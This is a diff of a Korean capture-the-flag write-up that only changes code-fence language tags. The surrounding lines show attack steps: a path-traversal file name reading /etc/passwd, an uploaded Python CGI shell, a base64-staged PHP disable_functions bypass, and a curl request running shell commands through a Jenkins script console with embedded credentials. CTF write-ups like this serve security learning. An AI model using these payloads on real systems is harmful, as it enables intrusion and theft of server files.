@@ -16,7 +16,7 @@ files = { 'file':('..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', f
 위와같이file name을구성함으로써file download가가능해진다
 
 
-```
+```py
 from arang import *
 import re,sys
 
@@ -100,7 +100,7 @@ File download자동화스크립트를짰다
 python으로작성된cgi파일을../cgi-bin/arang911.py로업로드하였다
 
 
-```
+```py
 #!/usr/bin/python3.6
 import cgi
 import os
@@ -169,7 +169,7 @@ disable_functions가 걸려있으니 우회하기 위해1day exploit을 찾아�
 현재php버전이7.2.24니까docker받아서 로컬테스트해보면 익스가 잘 되는것을 알 수 있다.
 
 
-```
+```py
 from arang import *
 import re,sys,time
 
@@ -186,7 +186,7 @@ for i in range(0,len(ex),1000):
 대강 서버에 업로드 한 후
 
 
-```
+```php
 file_put_contents("ex.php",str_replace("\r\n","\n",base64_decode(file_get_contents("/tmp/arang101"))));
 ```
 
@@ -269,7 +269,7 @@ key와 아까 얻은nickname으로remote access해보면 결과가 잘 나온다
 /script에 우선 접근 후script run날렸을때 실제 날아가는 패킷 잡아서 변조했다.
 
 
-```
+```bash
 curl --data "script=def+proc+%3D+%22ls -alR /%22.execute%28%29%0D%0Adef+b+%3D+new+StringBuffer%28%29%0D%0Aproc.consumeProcessErrorStream%28b%29%0D%0A%0D%0Aprintln+proc.text%0D%0Aprintln+b.toString%28%29&Jenkins-Crumb=3aa12ac3ad49ab60ee63b3fdf4d5ba4d4978eacfb5785753ff0fb6fa69a4ba3c&json=%7B%22script%22%3A+%22def+proc+%3D+%5C%22ls+-al+%2F%5C%22.execute%28%29%5Cndef+b+%3D+new+StringBuffer%28%29%5Cnproc.consumeProcessErrorStream%28b%29%5Cn%5Cnprintln+proc.text%5Cnprintln+b.toString%28%29%22%2C+%22%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%223aa12ac3ad49ab60ee63b3fdf4d5ba4d4978eacfb5785753ff0fb6fa69a4ba3c%22%7D&Submit=Run" -X POST http://Whitehat-NowYouSeeMe:11d5eb71408ae9b0e4a6219ce9a4aa1767@3.37.166.114:9999/script -i > out.txt;cat out.txt|grep FLAG -B5 -A5
 ```
 
